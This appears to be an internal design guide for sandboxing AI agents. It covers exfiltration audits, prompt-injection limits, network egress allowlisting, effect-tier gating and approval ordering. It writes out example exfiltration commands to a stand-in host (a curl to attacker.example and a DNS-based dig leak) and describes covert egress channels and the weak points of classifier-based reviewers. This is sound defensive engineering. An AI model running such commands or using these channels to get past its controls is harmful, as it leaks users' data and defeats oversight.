---
name: agent-safety-and-sandboxing
description: Places isolation tiers, permission layers, effect-tier classification, and human approval gates in a generated agent stack, and audits whether a configuration is exfiltration-capable. Use when choosing a sandbox (container vs. gVisor vs. microVM), classifying a tool or a call as read-only / reversible-write / irreversible-destructive, satisfying constitution Principle IV's interception-point requirement, adding a permissive or auto-approval mode, wiring a PreToolUse hook or deny rule, deciding where a human gate goes, exposing a destructive operation as a tool, giving an agent a shell or a general HTTP client, giving an agent network egress, evaluating a prompt-injection defense, or reviewing any design that claims injection is "handled" by filtering, classification, or system-prompt instructions.
---

# Agent safety and sandboxing

**Standing: v1, and more load-bearing after `plan.md` OD-09 than before it.** The pivot removed the
synthesis pipeline that was going to attach a static effect label to every tool, but constitution
Principle IV (NON-NEGOTIABLE) still binds **every emitted tool** — and v1 emits a shell and a general
HTTP client that can issue `DELETE` against real data. **The obligation did not defer with the
differentiator.** The consequence is the *Effect tiers and the interception point* section below,
which is the v1 decision procedure; `14-architecture-synthesis.md` records it as **D-22** and records
the tension with OD-09 as **C-16**.

**Updated 2026-08-03 — `plan.md` OD-10: v1 is read-only, and that changes the disposition table below
but nothing else in this skill.** The interception point is what *enforces* read-only, so it is more
load-bearing again rather than less. **Two things a reader will get wrong if they stop reading here.**
The trifecta audit below resolves **identically before and after OD-10** — read-only cuts no leg,
because egress is a shell plus network access and private data is a bound credential. And *provably
read-only* is not available: v1 resolves read-only from a **stated, unvalidated rule set**, and the
word "provably" must not appear in a spec that means "matched a safe method."

**Updated again 2026-08-03, later the same day, and this one corrects the skill rather than extending
it** (C-17, U-44; `plan.md` OD-12, proposed). **Principle IV has six bullets and this skill has only
ever enforced one of them.** Its *Effect tiers and the interception point* section encodes bullet 2,
permission tiers. Bullet 1 — *sandboxing with a real boundary … **network allowlisted to named
hosts*** — is equally NON-NEGOTIABLE, **v1 does not satisfy it**, and this skill filed the fix as a
mitigation to *propose*. Three consequences, all below: the trifecta section's read-only paragraph is
struck and rewritten; *Network egress* under *Sandboxing* gains the five-term specification that makes
the control real; and *Step 3* gains a fifth non-compliance pattern — **an interception point is not
an egress control**, because its visibility ends at the argv of any command it allows.

**Updated a third time 2026-08-03 — `plan.md` OD-12 ratified and OD-13 applied, taking the
constitution to v1.2.0 — and the correction above is now backed by a mechanism and by normative
text.** ~~`plan.md` OD-12, proposed~~ — decided. **What changes for this skill.** Bullet 1's
requirement is no longer a one-line phrase this skill had to expand; the constitution itself now
carries the terms, so the *Network egress* specification below **restates** Principle IV rather than
supplementing it, and a deviation from it is a constitutional violation rather than a skill
preference. **The enforcement point is a single mandatory egress proxy** that all sandbox traffic
traverses, holding the destination allowlist and the HTTP method allowlist together — which is what
makes *Step 3*'s fifth non-compliance pattern actionable rather than merely true: the remedy for *an
interception point is not an egress control* is to put the control somewhere argv cannot be walked
past. **Two things this does not change and a reader will reach for anyway.** The trifecta audit
still resolves the same way — the egress leg is narrowed to enumerated channels, not cut, because
the target's own API can fetch on the agent's behalf (U-44) — and *provably read-only* is still
unavailable, at a proxy exactly as in a dispatcher, because a verb is a convention and relocating a
lookup does not validate it (U-43).

Sources: `research/01-agent-anatomy.md` §8.1–§8.7; `research/08-auth-identity-and-secrets.md` §3.5,
§5.4, §8.1 item 4; `research/07-product-vision.md` §3.2.5 item 5;
`.specify/memory/constitution.md` Principle IV (**v1.2.0**), **bullets 1 and 2**;
`research/14-architecture-synthesis.md` D-16 (dormant), D-22 (amended), C-16, **C-17 (closed)**,
U-43, **U-44**, §2.6, §2.9, §7.6; `plan.md` OD-10, **OD-12**, **OD-13**.

The framing everything else derives from: **an agent is a program whose source code is written at
runtime by a language model that reads attacker-controlled input.** You would not run that program
with your credentials on your host. Design accordingly.

## The one thing to check first: the lethal trifecta

An agent is exfiltration-capable when it simultaneously has **(1) private data, (2) untrusted
content, (3) an egress path.** Any two are survivable. All three, and a successful injection becomes
data loss. **Cutting any one leg is a complete mitigation** for that agent.

Run this audit on every generated agent configuration, before shipping it:

```
For each agent:
  private_data = union(resource_scope of its tools) != {}
  untrusted    = any tool return, retrieved doc, DB row, or user field enters context
  egress       = any byte-path from context to outside
  if all three → refuse to assemble, or cut a leg and re-run
```

**Egress is systematically undercounted.** It is not "does this agent have an HTTP tool." Enumerate
every byte-path out: markdown image rendering, a search tool that accepts a full URL, webhook-shaped
tool calls, telemetry, error-reporting endpoints, DNS resolution. All of these are egress.

~~Because promoted functions carry `resource_scope` and `egress: none | allowlist[...]`, this analysis
is **static** — computable at promotion time. That is a safety property only a system that owns the
promotion step can offer. Use it.~~

**Wrong for v1 since `plan.md` OD-09; correct for v2.** There is no promotion step, so nothing carries
`resource_scope` or `egress` at generation time and **the trifecta audit cannot run statically.** This
is a real loss and not a bookkeeping one: the audit was a compile-time refusal, and v1 has no compile
time. **Run it per session instead, at configuration time**, over the concrete tool set the agent is
about to be handed — a shell plus network access is `egress = yes` unconditionally, and a credential
bound to the target application is `private_data = yes` unconditionally, so **the v1 default
configuration already has two legs and the audit reduces to: does untrusted content enter context?**
That is why the iframe tier is deferred (D-20) and why it must stay deferred until the third leg has
somewhere else to be cut.

**Read-only does not cut a leg, and this is the most common mistake made about it** (`plan.md`
OD-10, C-16). The trifecta's third condition is *egress*, not *writes to the target*. A read-only
agent holding a shell and a general HTTP client can still `curl https://attacker.example/?d=…`, which
is a read with respect to the application and a complete exfiltration with respect to the data. So the
audit above returns the same answer before and after OD-10. ~~**What read-only does buy is one cheap
option that was expensive before: with no writes to permit, an egress allowlist — target host only —
cuts the third leg at no cost to any capability v1 still claims.** That is the cheapest remaining
mitigation and it is not yet decided; propose it rather than assuming read-only did the job.~~

**Corrected 2026-08-03, later the same day: the allowlist is not an *option*, and "target host only"
is the wrong specification of it** (C-17, U-44; `plan.md` OD-12, ~~proposed~~ **decided
2026-08-03**, with OD-13 writing the specification into the constitution at v1.2.0 — and the
enforcement point is **one mandatory egress proxy** that all sandbox traffic traverses, holding the
destination allowlist and the method allowlist together, which is what makes it hold against a shell).

**It is already required.** Constitution Principle IV's *first* bullet — *sandboxing with a real
boundary … ~~**network allowlisted to named hosts**~~ *(amended to the four-term specification at
v1.2.0 — OD-13)* — mandates it as architecture, and
`research/08-auth-identity-and-secrets.md` §8.1 item 4 lists default-deny egress at the host among
the **hard requirements**. **v1 satisfies neither.** Note how the gap survived: everything in this
skill, in C-16, in D-22 and in OD-10 argues from Principle IV's *permission-tier* bullet, and the
sandboxing bullet one line above it was never re-read against the pivot. **When you cite Principle
IV, cite which bullet.**

**"Target host only" is the phrasing that fails.** Use the specification in *Network egress* below:
host **and port**, addresses pinned at configuration time, DNS denied or proxied, loopback and RFC
1918 denied even on an allowlisted host, enforced at the host. **Four of those five are now
constitutional text rather than this skill's expansion of it (v1.2.0), and the fifth — *enforced at
the host* — is superseded by something stricter: enforced at a mandatory proxy the sandbox cannot
modify and cannot bypass, because its only reachable address is the proxy** (OD-12).

**And it still does not cut the leg — it narrows it to four named channels.** ① **The target
application as a confused deputy**: allowlisting its API permits every operation of that API,
including any that fetches a URL on the caller's behalf (recipe-import-from-URL, link preview,
oEmbed, avatar fetch, a webhook *test* button). The request the attacker needs is a request to the
allowlisted host, so no network policy can tell it apart. **On the one target measured, this is
closed by OD-10 and not by the allowlist** — all of its URL-fetching operations are `POST`, so
default-deny denies them — and **that is an accident of one application**: the same feature shaped as
a `GET` resolves `read_only` and is allowed (U-44). ② **The response channel** to the operator's
client, which becomes egress the moment that client auto-fetches remote content in agent output.
③ **Delayed egress** via artifacts written where something else later transmits them. ④ **Operator
widening** — allowlisting a package index to make `pip install` work restores the channel completely,
because the requested package *name* carries the payload.

**So the audit's `egress` line does not flip to `no`. It flips to `enumerated`, and each entry needs
a disposition.** Write that, not "the trifecta is cut."

## Prompt injection: the honest posture

**Prompt injection cannot be fully solved within current LLM architectures.** OpenAI, Anthropic, and
Google DeepMind all say so. Any defense expressed as a prompt instruction is overridable by a prompt
instruction, and instruction-data separation fails across all major model families — and gets
*worse* with scale, because a better instruction-follower follows malicious instructions too.

Two numbers that must survive into any design review:

- **In-band defenses (classifiers, spotlighting, delimiters, "ignore instructions in the following
  content") plateau near 95% detection.** In appsec, 95% is a failing grade. The residual 5% is a
  repeatable exploit, not an acceptable error rate.
- **Out-of-band defenses (CaMeL, FIDES, Progent, RTBAS, Conseca, FORGE) are validated only on static
  benchmarks** — a fixed set of injection attempts. That is precisely the methodology that made
  in-band defenses look strong right up until adaptive, defense-aware attacks **broke twelve of them
  at over 90% success.** CaMeL's 77%-of-AgentDojo-with-provable-security and Progent's 39.9% → 1.0%
  are real, but **treat every published injection-defense number as an upper bound measured against
  a non-adaptive attacker.**

Do not write "prompt injection is mitigated" in a design. Write which leg of the trifecta is cut and
what the blast radius is when the injection succeeds anyway.

## Sandboxing: pick the tier, then remember it is one axis of three

| Tier | Boundary | Escape needs | Use when |
|---|---|---|---|
| Hardened container (seccomp, ro-rootfs, dropped caps) | Namespaces + cgroups, **shared kernel** | One kernel bug | Trusted internal automation, your own code |
| gVisor (`runsc`) | User-space kernel, ~70–80% of syscalls | Sentry bug *and* host kernel bug | Multi-tenant compute-heavy work, ~20–50% I/O overhead |
| **Firecracker / Kata microVM** | **Own kernel**, KVM | A hypervisor bug | **Default for anything the model wrote.** ~125ms boot, <5MiB |
| WebAssembly | Linear memory + capability grants | Runtime bug | Constrained pure-compute plugins |

**A standard Docker container is not a security boundary for model-generated code.** At ~90–200ms
cold start, "microVMs are too slow" is no longer an honest justification for weaker isolation.

Isolation is three axes and teams routinely secure only the first:

1. **Compute** — the table above.
2. **Filesystem** — mount only the workspace, read-only where possible. An agent that can read
   `~/.aws/credentials` has the account no matter how good the kernel isolation is.
3. **Network egress** — default-deny with a destination allowlist. **This is the highest-value
   single control in this document,** and it is the one most often skipped because it breaks
   `pip install`.

**Specify it in these five terms or it does not hold.** Each corresponds to a way the one-line
version fails in practice (C-17; `plan.md` OD-12, ~~proposed~~ **decided 2026-08-03**). **The first
four terms are constitutional text as of v1.2.0 (OD-13) and are quoted here rather than proposed;
the fifth is stated below in the form OD-12 decided, which is stricter than "at the host":**

| Term | Why the looser version fails |
|---|---|
| **Host *and* port**, never host | Where the agent is co-located with the target — the default in a self-hosted deployment — allowlisting the target's host permits `psql` to that host. The control's own headline requirement is defeated by its own allowlist |
| **Addresses pinned at configuration time**, not resolved per request | A name-keyed allowlist re-resolves, and a re-resolved name can be re-pointed at loopback or the database. This is DNS rebinding, and it is why *"allowlisted to named hosts"* is the weaker key |
| **DNS denied or proxied** | `dig $(secret).attacker.example` exfiltrates without ever completing a connection to a blocked destination. A reachable recursive resolver defeats every other row in this table |
| **Loopback, RFC 1918, link-local and the cloud metadata address denied** — including on an allowlisted host | The metadata endpoint is credential theft rather than exfiltration, and it is reachable from inside an otherwise correct allowlist |
| **Enforced outside the guest, at a mandatory proxy every outbound byte traverses** — ~~*at the host*~~, which is necessary and not sufficient | In-guest policy is configuration, and the agent is a program whose instructions arrive in attacker-influenceable text. A host firewall gets the *destination* right and sees nothing else; if you also want a **method** allowlist, it has to be a proxy, and the proxy must be un-modifiable by the agent and be the sandbox's only reachable address. **The trap this closes:** against an HTTPS target a CONNECT-level proxy sees host and port only, so a method allowlist silently degrades into a destination allowlist while appearing intact — read the note below before specifying one |

**On seeing the method at all, because this is where a control that looks like enforcement stops
being one** (`plan.md` OD-12, 2026-08-03). Enforcing a method allowlist requires reading the method
and path, and against an HTTPS destination that means terminating TLS at the proxy, trusting a proxy
CA inside the sandbox, and re-originating. **That is feasible and it was rejected for v1**: a trust
anchor in the guest concentrates impersonation of every host into one key, it forces a certificate
pin onto self-hosted targets that serve private-CA or self-signed certificates, and it is the point
at which an operator reaches for the escape hatch — a control they route around is worth less than a
narrower one they run. **The v1 posture is re-origination instead:** hand the agent a **cleartext**
proxy endpoint as the target's base URL, let the proxy read method and path in the clear, and have
it make its own validated TLS connection to the pinned address. **This works only where there is one
destination and you own the base-URL string.** With more than one destination you are back to
*terminate TLS, or say plainly that you filter by destination only* — and saying so is the correct
move, because a stated boundary beats a control that appears to enforce something it cannot see.

**On `pip install`, which is the reason this control gets dropped:** do not solve it by widening the
allowlist. A package index accepts arbitrary strings in the requested name and is therefore a complete
exfiltration channel. **Ship dependencies resolved**, and treat any operator widening as a reviewed
configuration change rather than a flag.

Adopting code-execution-as-tool-calling for its token savings **obligates** operating a real
sandbox. Put that price in the decision.

## Effect tiers and the interception point — constitution Principle IV, as a procedure

Principle IV is **NON-NEGOTIABLE** and has two halves that are routinely half-satisfied:

> **(a) every emitted tool is classified read-only, reversible-write, or irreversible/destructive,
> and (b) the tier is enforced by an interception point that can *block*.**

**A label with no blocking enforcement does not satisfy Principle IV. Neither does a block with no
classification.** Both halves, or the design is non-compliant.

### Step 1 — pick the classification unit, and get this right first

**Classify the *call* when the tool is general; classify the *tool* only when the tool is specific.**

| Tool shape | Unit | Why |
|---|---|---|
| One synthesized tool per operation (`refund_order`) | **Tool** | Effect is fixed at generation time. Classify once, attach to the manifest. This is the v2 path |
| A general HTTP client, a shell, a DB session, a `search()`/`execute()` pair | **Call** | A tool-level label is a lie in both directions: `curl` is not read-only, and calling it destructive denies every `GET`. **This is the v1 path** |

Getting this wrong is the common failure. A design that labels `bash: destructive` and stops has
technically classified every tool and has enforced nothing useful — it will be switched off within a
day, which is the disable-by-noise failure mode arriving through the front door.

### Step 2 — resolve the tier from the concrete, fully-substituted action

**Never classify a template, an intent, or the model's description of what it is about to do.**
Resolve after substitution, on the bytes that will actually be sent.

| Signal | Read-only | Reversible write | Irreversible / destructive |
|---|---|---|---|
| **HTTP verb** (free wherever a schema is published) | `GET` `HEAD` `OPTIONS` | `POST` `PUT` `PATCH` | `DELETE` |
| **SQL verb** | `SELECT`, `EXPLAIN` | `INSERT`, single-row `UPDATE` with a `WHERE` | `DROP` `TRUNCATE`, DDL, `UPDATE`/`DELETE` without `WHERE` or over N rows |
| **Shell** | no classification available from the verb — parse the command | | |
| **Unparseable, unmatched, or ambiguous** | — | — | **Deny. Unknown authority is not a permission** |

**The HTTP verb is a crude but real proxy, and its crudeness must be handled rather than noted.** It
is unsound in both directions: `GET /admin/reindex` mutates, `POST /search` does not, and
`POST /orders/{id}/cancel` is irreversible while wearing the reversible verb. So:

- **The verb sets a floor, never a ceiling.** It may only ever *raise* a call's tier when combined
  with another signal (path segment matching a destructive vocabulary, an operation marked
  irreversible in the spec, a missing `WHERE`). A signal that *lowers* the verb's tier is not
  admissible without a human review of that specific rule.
- **Idempotency is not reversibility.** `PUT` is idempotent and can silently overwrite a record with
  no undo. Do not let the RFC's vocabulary do safety work it was never designed for.
- **A path with no resolvable verb is a denied call**, not a guessed one — and note that this is
  exactly the unresolved case E15 measured, where no schema-free mechanism recovers which verbs a
  path serves and the `Allow` header is wrong in opposite directions on three routers (U-39).

### Step 3 — put the interception point somewhere that can actually block

The interception point is **deterministic code, synchronous, in the call path, before the request
leaves the process.** It maps onto layers 1–2 of the permission ordering below — a guard hook and
deny rules — and it inherits that section's central property: **it resolves before any permissive
mode, auto-approval flag, or classifier is consulted.**

Four things that look like compliance and are not:

1. **A post-hoc audit log.** Recording that a `DELETE` happened is not blocking it.
2. **A system-prompt rule** — "always confirm before deleting." Defeated by any successful injection.
3. **A classifier as the floor.** Layer 4 is a filter statistic against an adaptive attacker, not a
   boundary. It may narrow what reaches a human; it may not replace the deterministic layers.
4. **Asynchronous or advisory interception** — a hook whose return value the caller may ignore.

**A fifth, added 2026-08-03, and it is the one this project got wrong: treating the interception
point as an egress control** (C-17). A tier gate sees the call it is handed. Where the tool is a
shell, that is argv — and **any command the gate allows can open a socket the gate never sees.**
`python3 -c …`, `make`, a test runner, a language server: all are legitimate allowed commands and all
are unrestricted egress. A resolution ladder that routes *"unmatched egress"* to `UNKNOWN → deny`
looks like it closes this and does not.

**Two rules follow.** **Egress is enforced below the process** — host network policy, per *Network
egress* above — because it is a network-layer property and no application-layer check can see past a
subprocess boundary. And **check what your ladder does with shell under a default-deny disposition**:
if no rule ever resolves a shell command to read-only, then collapsing the dispositions to
allow-read / deny-everything-else silently denies the shell entirely. That is a capability decision
arriving disguised as a safety default, and it should be made deliberately or not at all.

**How this project resolved it, 2026-08-03 — `plan.md` OD-12 — and the shape of the resolution is
the reusable part.** The two rules above were treated as a dilemma: deny every shell command, or keep
the shell and control no egress. **It is not a dilemma, because both horns assume the effect gate and
the egress control are the same mechanism.** Separating them dissolves it: **move both the
destination allowlist and the method allowlist into one mandatory proxy that every outbound byte
traverses**, and the gate no longer needs to see past a subprocess boundary, because it is no longer
inside the process. A `curl` in a shell and the runtime's own HTTP client arrive at the proxy
identically. **Consequences worth carrying to the next design.** The shell runs, and **nothing
classifies a shell command for effect** — delete that step from the ladder rather than leaving both
readings live. `UNKNOWN` survives and changes subject: not an unparseable argv, but **a request the
proxy cannot match to a safe operation in the target's published spec.** The proxy becomes a single
enforcement point, so it must be un-modifiable by the agent and outside anything the agent can write
to. And **the precision claim does not improve** — Step 5 still applies at the proxy, because
relocating a verb lookup does not validate it.

### Step 4 — bind the tier to a disposition, then to a credential

| Tier | Default disposition | **v1 disposition (`plan.md` OD-10)** |
|---|---|---|
| Read-only | Auto-approve. Still subject to egress and scope controls — a read *is* the exfiltration in a trifecta configuration | **Allow**, and only where it also clears the side-effecting-read deny list |
| Reversible write | Auto-approve **only** against a non-production target, or where the reversal path is implemented and tested. Otherwise gate | **Deny** |
| Irreversible / destructive | Always gate. The four rules in *Destructive operations gate in topology* apply in full — unreachable as a direct call, the human sees the **resolved** action, the credential is minted after approval, one signed audit record | **Deny.** Those four rules defer with writes rather than being satisfied |
| Unresolved | **Deny**, with a legible reason so the agent can find a safer path | **Deny** — unchanged, and now the same outcome as everything above it |

**The general column is the design; the v1 column is what ships until the classifier is scored.** Two
consequences worth carrying deliberately. **Nothing escalates to a human at runtime**, which removes
the disable-by-noise failure mode below entirely rather than mitigating it — and removes the operator
override with it, which is a usability cost taken on purpose. And **the only misclassification that
can still cost integrity is a read-only resolution on an endpoint that writes**, so that is the whole
of what the precision measurement has to cover. Collapsing four dispositions into two is what makes
that true; do not restore the middle rows without restoring the measurement.

### Step 5 — state the precision you are claiming, and whether you measured it

**A gate is only as good as its classifier, and the v1 classifier's precision has never been
measured** (U-43). The superseded form of this requirement (D-16) gated all writes on ≥ 0.98
read-only-label precision from a static analyzer that no longer exists; **do not quote that number as
if it had been met, and do not quote it as if it applied.** State the rule set, state that it is
unvalidated, and default-deny everything it cannot resolve. Anything else is a derived claim asserted
as fact, which Principle I already forbids.

**And when the measurement is finally designed, do not inherit the threshold either** (`plan.md`
OD-10). 0.98 was chosen for a static label over a curated catalogue; a per-call gate over a general
shell has a different base rate and a different blast radius. Re-derive the number, and prefer the
**directional** form — *zero operations resolved read-only that write* — because that is the only
error class default-deny leaves capable of costing integrity.

## Permission ordering — non-negotiable

Every team walks the same path: approve everything manually → click approve forty times → disable
prompts entirely. That is the **disable-by-noise failure mode**, and it is a security problem, not
an ergonomics one: when 99 of 100 checkpoints are an obvious yes, the dangerous one slips through
wearing the same costume.

Evaluate in exactly this order:

```
1. Guard hook (PreToolUse)  — deterministic code, cannot be bypassed by a permissive mode
2. Deny rules               — resolved BEFORE allow; not overridable by a classifier
                              or a --dangerously-skip flag
3. Allow rules              — auto-approve reads, local writes, tests
4. Classifier / auto-review — separate model call grades what is left
5. Human                    — only what survives all four
```

**The ordering is the entire design.** Because layers 1–2 resolve before the permissive mode is
consulted, prompts can be turned nearly all the way off without giving up the boundaries that
matter. Build the floor first, then buy the speed. A design that puts a classifier or an
auto-approval flag ahead of deterministic deny rules is wrong regardless of how good the classifier
is.

### Layer 4: the Auto-review pattern, and its limit

Codex Auto-review replaces human approval at the sandbox boundary with a separate grading agent. In
a 10,000-action snapshot: **9,280 ran inside the sandbox with no review at all, 720 escalated, the
reviewer denied 7, and the acting agent recovered on its own for 4 of those.** Sessions stop for a
human roughly **200× less often** than in manual mode.

Two constraints that make it work, both structural:

- **The reviewer is a separate call with a narrower job and no stake in task completion.** The main
  agent is optimized to finish the task, which creates pressure to treat an approval boundary as an
  obstacle. A single agent asked to both finish and police itself will rationalize.
- **The classifier reads the user prompt, tool name, argument shape, target paths, and network
  destinations — never the acting agent's own reasoning,** which is exactly the channel an injection
  would use to argue for approval.

**The limit:** adopt Auto-review for the coding-tool surface *inside* the sandbox, where the blast
radius is the sandbox. It is **not** a substitute for human approval on the resource plane. The
reviewer is still a model, so its denial rate against an adaptive attacker is a filter statistic,
not a boundary — and there the residual is a repeatable exploit against production data.

## Destructive operations gate in topology, not prompts

An LLM caller cannot talk its way past a graph edge because it never gets a vote. A gate written as
"always ask before deleting" in a system prompt is defeated by any successful injection.

**The always-gate set** (deny by default, never auto-approvable): unbounded-scope mutation
(`UPDATE`/`DELETE` without `WHERE` or over N rows, `TRUNCATE`, `DROP`); schema/DDL; money movement;
bulk external communication; credential and identity operations; infrastructure mutation; bulk data
egress; **and anything the analyzer marked `authorization: UNRESOLVED` — unknown authority is not a
permission.**

For every tool in that set, all four of these:

1. The tool is **not reachable as a direct call** from the agent loop — only as a node downstream of
   an approval node.
2. The approval payload is the **resolved, concrete action**: rendered SQL, exact recipient list,
   exact dollar amount. **Approving the model's natural-language summary of an action is theatre**
   — the summary and the action can differ.
3. The credential is minted **after** approval, scoped to the approved action, TTL in seconds.
   Approval and credential issuance are the same event.
4. Decision, resolved action, approver identity, and credential ID enter the audit log as one
   signed record.

Encode the invariant `every irreversible node is preceded by an approval node` as a topology test
(see `graph-vs-loop-decision`). And note: **nothing an agent writes may ever influence an
authorization decision** — memory is an authorization-bypass channel, not just a leak channel.

## Where gates go, and where they must not

Gates spend human attention, which runs out first. Place by **irreversibility × blast radius**.

| Gate here | Never gate here |
|---|---|
| Irreversible: prod deploy, `DROP`/`TRUNCATE`, force push, payment, external email | Reads of any kind |
| Boundary crossings: leaving the sandbox, first egress to a new destination, credential use | Local writes in an ephemeral workspace |
| Scope expansion beyond the original request | Individual steps inside an approved plan |
| Plan approval, **once**, before a long autonomous run | Each iteration of a retry loop |

Three rules that make gates survive production:

1. **Gate the plan, not the steps.** One plan approval up front plus a gate at the irreversible end
   catches nearly everything per-step gating catches, at a fraction of the attention cost.
2. **Make reversibility a first-class property, then gate only what lacks it.** Branch-and-PR over
   direct commits, staged writes, dry-run-then-apply. Every action made reversible is a gate you
   get to delete — the highest-leverage move available, and an engineering investment rather than a
   policy one.
3. **Denials must be legible to the agent.** Codex data shows the agent frequently finds a safer
   path when told why; an opaque error just produces retries against the same wall.

## Verifier ordering

**Prefer the cheapest verifier that can actually fail:** schema → assertion between stages →
executable oracle (compiler, tests, linter, `EXPLAIN`, migration dry-run) → independent model review
→ human. Escalate only when the tier below cannot express the property. Validate tool *returns*, not
just arguments — a tool return is untrusted content. Bound every return with an explicit truncation
marker.

## The inverse, which is the most useful rule here

**If a function does not need agency, do not promote it.** A deterministic call with validated
arguments has no injection surface, no budget risk, and no gate. The most secure agent is the one
you did not build; promotion should be a deliberate act with a stated justification, never a
default.

**Deferred to v2 with the promotion step (`plan.md` OD-09) — and its loss is the single largest
safety cost of the pivot, which is worth naming rather than absorbing.** This rule was the cheapest
control in the document because it removed attack surface instead of guarding it. v1 has no promotion
step to be deliberate at, so **the surface is maximal by construction: a shell and a general HTTP
client reach everything the credential reaches.** The v1 substitute is weaker and must be recognized
as weaker — the tier gate in *Effect tiers and the interception point* guards a surface it cannot
shrink. **When the promotion step returns, this rule returns with it, and it should be treated as a
reason to want it back rather than as a v2 nicety.**
